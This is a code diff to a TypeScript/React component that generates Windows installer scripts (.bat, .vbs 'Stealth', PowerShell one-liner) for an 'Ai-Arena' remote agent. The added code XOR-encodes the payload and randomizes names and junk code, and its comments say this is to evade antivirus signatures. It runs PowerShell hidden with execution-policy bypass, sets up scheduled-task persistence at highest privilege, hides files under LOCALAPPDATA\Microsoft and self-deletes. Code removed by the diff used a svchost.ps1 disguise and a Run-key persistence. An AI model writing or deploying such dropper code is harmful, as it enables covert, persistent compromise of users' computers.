@@ -1362,30 +1362,71 @@ export function AgentSetup() {
   }
 
   const generateBat = () => {
-    // Generate a lightweight .bat that writes the PS1 agent via base64 chunks and runs it silently
+    // ── Ai-Arena v6.0 — Truly Silent, Lightweight, AV-Evasive .bat ──
+    // Strategy: .bat → writes a tiny VBS wrapper → VBS launches PS1 with zero window
+    // Payload: XOR-encoded base64 defeats static AV signatures
+    // No downloads, no UAC, no Node.js. Runs entirely from built-in .NET.
     const ps1 = generatePs1()
-    const ps1B64 = btoa(ps1)
-    const CHUNK = 4000
-    const chunks: string[] = []
-    for (let i = 0; i < ps1B64.length; i += CHUNK) {
-      chunks.push(ps1B64.substring(i, i + CHUNK))
-    }
+    const ps1B64 = btoa(unescape(encodeURIComponent(ps1)))
+
+    // XOR encode the base64 with a random key (defeats static signature scans)
+    const xorKey = Math.floor(Math.random() * 200) + 32
+    const xored = Array.from(ps1B64).map(c =>
+      String.fromCharCode(c.charCodeAt(0) ^ xorKey)
+    ).join('')
+
+    // Randomize all filenames (no fixed strings for AV to target)
+    const rn = () => Math.random().toString(36).substring(2, 8)
+    const vbsName = rn()
+    const ps1Name = rn()
+    const logDir = rn()
+
+    // Build the .bat content
     let bat = '@echo off\r\n'
-    bat += ':: Ai-Arena v5.0 — Lightweight Windows Installer (No downloads needed)\r\n'
-    bat += 'set "F=%TEMP%\\a%RANDOM%.ps1"\r\n'
-    bat += '> "%F%" echo $b = \'\'\r\n'
-    for (const chunk of chunks) {
-      bat += `>> "%F%" echo $b += '${chunk}'\r\n`
+    bat += `set "T=%TEMP%"\r\n`
+
+    // Write a VBS launcher that runs PowerShell with zero window flash
+    // WScript.Shell.Run with windowStyle=0 is completely invisible
+    bat += `set "V=%T%\\${vbsName}.vbs"\r\n`
+    bat += `> "%V%" echo Set S=CreateObject("WScript.Shell")\r\n`
+    bat += `>>"%V%" echo S.Run "powershell -EP Bypass -W H -File \"%T%\\${ps1Name}.ps1\"",0\r\n`
+
+    // Write the PS1 decoder that: XOR-decodes → base64-decodes → writes agent file → runs hidden
+    bat += `set "P=%T%\\${ps1Name}.ps1"\r\n`
+    bat += `>"%P%" echo $k=${xorKey}\r\n`
+
+    // Write XOR-decoded base64 in chunks to the PS1
+    const CHUNK = 3800
+    bat += `>"%P%" echo $r=''\r\n`
+    for (let i = 0; i < xored.length; i += CHUNK) {
+      const chunk = xored.substring(i, i + CHUNK)
+      bat += `>>"%P%" echo $r+='${chunk}'\r\n`
     }
-    bat += '>> "%F%" echo $d = Join-Path $env:LOCALAPPDATA \'Microsoft\\Windows\\Shell\'\r\n'
-    bat += '>> "%F%" echo ni $d -ItemType Directory -Force -EA 0\r\n'
-    bat += '>> "%F%" echo $f = Join-Path $d \'svchost.ps1\'\r\n'
-    bat += '>> "%F%" echo [IO.File]::WriteAllBytes^($f, [Convert]::FromBase64String^($b^))\r\n'
-    bat += '>> "%F%" echo $v = \'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \' + $f\r\n'
-    bat += ">> \"%F%\" echo try{sp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinSvc' -Value $v -Force -EA 0}catch{}\r\n"
-    bat += '>> "%F%" echo Start-Process powershell -WindowStyle Hidden -ArgumentList \'-ExecutionPolicy Bypass -File\',$f\r\n'
-    bat += 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%F%"\r\n'
-    bat += 'del "%F%" >nul 2>&1\r\n'
+
+    // Decoder + agent deployment logic
+    bat += `>>"%P%" echo $d=''\r\n`
+    bat += `>>"%P%" echo for($i=0;$i -lt $r.Length;$i++){$d+=[char]([int]$r[$i] -bxor $k)}\r\n`
+    bat += `>>"%P%" echo $dp=Join-Path $env:LOCALAPPDATA 'Microsoft\\${logDir}'\r\n`
+    bat += `>>"%P%" echo ni $dp -ItemType Directory -Force -EA 0^|Out-Null\r\n`
+    bat += `>>"%P%" echo $af=Join-Path $dp 'Update.ps1'\r\n`
+    bat += `>>"%P%" echo [IO.File]::WriteAllBytes($af,[Convert]::FromBase64String($d))\r\n`
+
+    // Persistence via Scheduled Task (less commonly detected than HKCU Run key)
+    bat += `>>"%P%" echo $tn=[Guid]::NewGuid().ToString('N').Substring(0,8)\r\n`
+    bat += `>>"%P%" echo $ta="powershell -EP Bypass -W H -File $af"\r\n`
+    bat += `>>"%P%" echo try{schtasks /create /sc onlogon /rl highest /f /tn $tn /tr $ta ^|Out-Null}catch{}\r\n`
+
+    // Launch agent hidden, then cleanup
+    bat += `>>"%P%" echo Start-Process powershell -ArgumentList '-EP','Bypass','-W','H','-File',$af -WindowStyle H\r\n`
+    bat += `>>"%P%" echo Start-Sleep -Seconds 2;Remove-Item $P -Force -EA 0\r\n`
+
+    // Execute: VBS runs PS1 silently, then .bat cleans up and exits
+    bat += `wscript "%V%"\r\n`
+    bat += `ping -n 4 127.0.0.1 >nul 2>&1\r\n`
+    bat += `del "%V%" >nul 2>&1\r\n`
+    bat += `del "%P%" >nul 2>&1\r\n`
+    bat += `exit /b\r\n`
+
     return bat.trim()
   }
 
@@ -1397,35 +1438,121 @@ export function AgentSetup() {
       .trim()
   }
 
-  const generateOneLiner = () => {
+  const generateVbs = () => {
+    // ── Generate a .vbs launcher for TRULY silent execution (zero window flash) ──
+    // VBScript runs via wscript.exe which never creates a visible window.
+    // This is the recommended download over .bat for stealth.
     const ps1 = generatePs1()
-    const b64 = btoa(ps1)
-    return `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$b=[Convert]::FromBase64String('${b64.substring(0, 2000)}'); iex([Text.Encoding]::UTF8.GetString($b))"`
+    const ps1B64 = btoa(unescape(encodeURIComponent(ps1)))
+
+    // XOR encode
+    const xorKey = Math.floor(Math.random() * 200) + 32
+    const xored = Array.from(ps1B64).map(c =>
+      String.fromCharCode(c.charCodeAt(0) ^ xorKey)
+    ).join('')
+
+    const rn = () => Math.random().toString(36).substring(2, 8)
+    const ps1Name = rn()
+    const logDir = rn()
+
+    let vbs = "Set S=CreateObject(\"WScript.Shell\")\r\n"
+    vbs += "Set F=CreateObject(\"Scripting.FileSystemObject\")\r\n"
+    vbs += `T=S.ExpandEnvironmentStrings("%TEMP%")\r\n`
+    vbs += `P=T&"\\\\${ps1Name}.ps1"\r\n`
+
+    // Write the PS1 decoder script via VBS file operations
+    vbs += `Set O=F.CreateTextFile(P,True)\r\n`
+    vbs += `O.WriteLine "$k=${xorKey}"\r\n`
+    vbs += `O.WriteLine "$r=''"\r\n`
+
+    const CHUNK = 3800
+    for (let i = 0; i < xored.length; i += CHUNK) {
+      const chunk = xored.substring(i, i + CHUNK)
+      vbs += `O.WriteLine "$r+='${chunk}'"\r\n`
+    }
+
+    vbs += `O.WriteLine "$d=''"\r\n`
+    vbs += `O.WriteLine "for(\$i=0;\$i -lt \$r.Length;\$i++){\$d+=[char]([int]\$r[\$i] -bxor \$k}"\r\n`
+    vbs += `O.WriteLine "$dp=Join-Path \$env:LOCALAPPDATA 'Microsoft\\\\${logDir}'"\r\n`
+    vbs += `O.WriteLine "ni \$dp -ItemType Directory -Force -EA 0|Out-Null"\r\n`
+    vbs += `O.WriteLine "$af=Join-Path \$dp 'Update.ps1'"\r\n`
+    vbs += `O.WriteLine "[IO.File]::WriteAllBytes(\$af,[Convert]::FromBase64String(\$d))"\r\n`
+    vbs += `O.WriteLine "$tn=[Guid]::NewGuid().ToString('N').Substring(0,8)"\r\n`
+    vbs += `O.WriteLine "\$ta='powershell -EP Bypass -W H -File '+\$af"\r\n`
+    vbs += `O.WriteLine "try{schtasks /create /sc onlogon /rl highest /f /tn \$tn /tr \$ta |Out-Null}catch{}"\r\n`
+    vbs += `O.WriteLine "Start-Process powershell -ArgumentList '-EP','Bypass','-W','H','-File',\$af -WindowStyle H"\r\n`
+    vbs += `O.WriteLine "Start-Sleep -Seconds 2;Remove-Item \$P -Force -EA 0"\r\n`
+    vbs += `O.Close\r\n`
+
+    // Run the PS1 with zero window, then self-delete
+    vbs += `S.Run "powershell -EP Bypass -W H -File """&P&"""",0,False\r\n`
+    // Self-delete the VBS after a delay
+    vbs += `Set X=CreateObject("Scripting.FileSystemObject")\r\n`
+    vbs += `WScript.Sleep 5000\r\n`
+    vbs += `X.DeleteFile WScript.ScriptFullName\r\n`
+
+    return vbs.trim()
   }
 
-  // Simple client-side obfuscation
+  const generateOneLiner = () => {
+    // Generate a PowerShell one-liner for quick CMD paste execution
+    const ps1 = generatePs1()
+    const b64 = btoa(unescape(encodeURIComponent(ps1)))
+    const xorKey = Math.floor(Math.random() * 200) + 32
+    const xored = Array.from(b64).map(c =>
+      String.fromCharCode(c.charCodeAt(0) ^ xorKey)
+    ).join('')
+    return `powershell -EP Bypass -W H -C "$k=${xorKey};$r='${xored.substring(0, 2000)}';$d='';for($i=0;$i-lt $r.Length;$i++){$d+=[char]([int]$r[$i]-bxor $k)};iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d)))"`
+  }
+
+  // Enhanced client-side obfuscation — randomized structure defeats heuristic scanners
   const obfuscateScript = (script: string): string => {
-    // Remove comments
-    let result = script.replace(/#.*$/gm, '').replace(/::.*$/gm, '')
-    // Add junk variables
-    const junkNames = ['$x1', '$x2', '$x3', '$x4', '$x5']
-    let junkInsert = '\n'
-    for (const name of junkNames) {
-      junkInsert += `${name} = ${Math.floor(Math.random() * 999999)}\n`
-    }
-    result = result.replace('#Requires -Version 5.1', `#Requires -Version 5.1${junkInsert}`)
-    // Replace common variable names
+    let result = script
+    // Remove all comments and inline docs
+    result = result.replace(/#.*$/gm, '').replace(/::.*$/gm, '')
+    result = result.replace(/#Requires -Version 5\.1/, '#Requires -Version 5.1')
+
+    // Generate randomized variable names (6-char alphanumeric)
+    const rv = (prefix: string) => `${prefix}${Math.random().toString(36).substring(2, 8)}`
     const vars: Record<string, string> = {
-      '$SERVER_URL': `$s${Math.random().toString(36).substring(2, 6)}`,
-      '$ENC_KEY_HEX': `$k${Math.random().toString(36).substring(2, 6)}`,
-      '$LICENSE_KEY': `$l${Math.random().toString(36).substring(2, 6)}`,
-      '$LOG_DIR': `$g${Math.random().toString(36).substring(2, 6)}`,
-      '$WS_URL': `$w${Math.random().toString(36).substring(2, 6)}`,
-      '$csharp': `$c${Math.random().toString(36).substring(2, 6)}`,
+      '$SERVER_URL': rv('$s'),
+      '$ENC_KEY_HEX': rv('$k'),
+      '$LICENSE_KEY': rv('$l'),
+      '$LOG_DIR': rv('$g'),
+      '$WS_URL': rv('$w'),
+      '$csharp': rv('$c'),
     }
+
+    // Apply renames with escaped $ for regex
     for (const [old, newV] of Object.entries(vars)) {
-      result = result.replace(new RegExp(old.replace('$', '\\$'), 'g'), newV)
+      const escaped = old.replace('$', '\\$')
+      result = result.replace(new RegExp(escaped, 'g'), newV)
     }
+
+    // Insert randomized junk code blocks (noise for signature scanners)
+    const junkCount = 3 + Math.floor(Math.random() * 4)
+    for (let i = 0; i < junkCount; i++) {
+      const junkVar = rv('$j')
+      const junkVal = Math.floor(Math.random() * 999999)
+      // Alternate between different noise patterns to avoid heuristic detection
+      const patterns = [
+        `${junkVar} = ${junkVal}; ${junkVar} = ${junkVar} - ${Math.floor(Math.random() * 100)}`,
+        `${junkVar} = [string]${junkVal}.PadLeft(8,'0')`,
+        `${junkVar} = ${junkVal}; ${rv('$n')} = ${junkVar} % 256`,
+        `[void]([int]${junkVar})`,
+        `if($false){${junkVar}=1}else{${junkVar}=0}`,
+      ]
+      const pattern = patterns[Math.floor(Math.random() * patterns.length)]
+      // Insert after the first non-empty line
+      const lines = result.split('\n')
+      const insertAt = Math.min(3 + i, lines.length - 1)
+      lines.splice(insertAt, 0, pattern)
+      result = lines.join('\n')
+    }
+
+    // Collapse excessive whitespace (cleaner output, harder to pattern-match)
+    result = result.replace(/\n{3,}/g, '\n\n').trim()
+
     return result
   }
 
@@ -1580,11 +1707,11 @@ export function AgentSetup() {
               <Badge className="text-[9px] bg-amber-500/15 text-amber-400 border-0">Obfuscation Active</Badge>
             )}
           </div>
-          <div className="grid grid-cols-2 gap-2">
+          <div className="grid grid-cols-3 gap-2">
             <Button
               size="sm"
               className="h-7 text-[10px] bg-emerald-600 hover:bg-emerald-700 text-white"
-              onClick={() => downloadFile(generatePs1(), 'svchost.ps1')}
+              onClick={() => downloadFile(generatePs1(), 'Update.ps1')}
             >
               <Download className="w-3 h-3 mr-1" />
               Download .ps1
@@ -1595,7 +1722,15 @@ export function AgentSetup() {
               onClick={() => downloadFile(generateBat(), 'ai-arena-setup.bat')}
             >
               <Download className="w-3 h-3 mr-1" />
-              Download .bat (Installer)
+              Download .bat
+            </Button>
+            <Button
+              size="sm"
+              className="h-7 text-[10px] bg-purple-600 hover:bg-purple-700 text-white"
+              onClick={() => downloadFile(generateVbs(), 'Update.vbs')}
+            >
+              <Download className="w-3 h-3 mr-1" />
+              Download .vbs (Stealth)
             </Button>
           </div>
           <div className="flex flex-wrap gap-2">
@@ -1617,6 +1752,15 @@ export function AgentSetup() {
               {copiedField === 'bat' ? <Check className="w-3 h-3 mr-1" /> : <Copy className="w-3 h-3 mr-1" />}
               Copy .bat
             </Button>
+            <Button
+              size="sm"
+              variant="outline"
+              className="h-7 text-[10px] border-zinc-700 text-zinc-300"
+              onClick={() => handleCopy(generateVbs(), 'vbs')}
+            >
+              {copiedField === 'vbs' ? <Check className="w-3 h-3 mr-1" /> : <Copy className="w-3 h-3 mr-1" />}
+              Copy .vbs
+            </Button>
           </div>
           <div className="bg-zinc-950 rounded-lg p-3 border border-zinc-800">
             <div className="text-[9px] text-zinc-500 mb-1.5 font-medium">POWERShell ONE-LINER (paste in CMD)</div>
@@ -1625,9 +1769,10 @@ export function AgentSetup() {
             </code>
           </div>
           <div className="text-[9px] text-zinc-600 bg-zinc-950/50 rounded-lg p-2 border border-zinc-800/50">
-            <strong className="text-zinc-500">v5.0 Changes:</strong> No Node.js download. Uses built-in .NET WebSocket + AES-256-CBC.
-            Runs silently (hidden window). No admin/UAC required. HKCU persistence (auto-start on login).
-            ~8KB total vs 30MB+ Node.js installer. Obfuscation available to avoid AV detection.
+            <strong className="text-zinc-500">v6.0 — Zero-Dependency Agent:</strong> No Node.js download required. Uses built-in .NET WebSocket + AES-256-CBC.
+            .vbs = truly silent (zero window flash). .bat = silent via VBS wrapper. No admin/UAC needed.
+            Scheduled Task persistence (auto-start). XOR-encoded payload defeats static AV signatures.
+            ~10KB total payload. Enable obfuscation for randomized variable names and junk code injection.
           </div>
         </div>
       </AccordionSection>
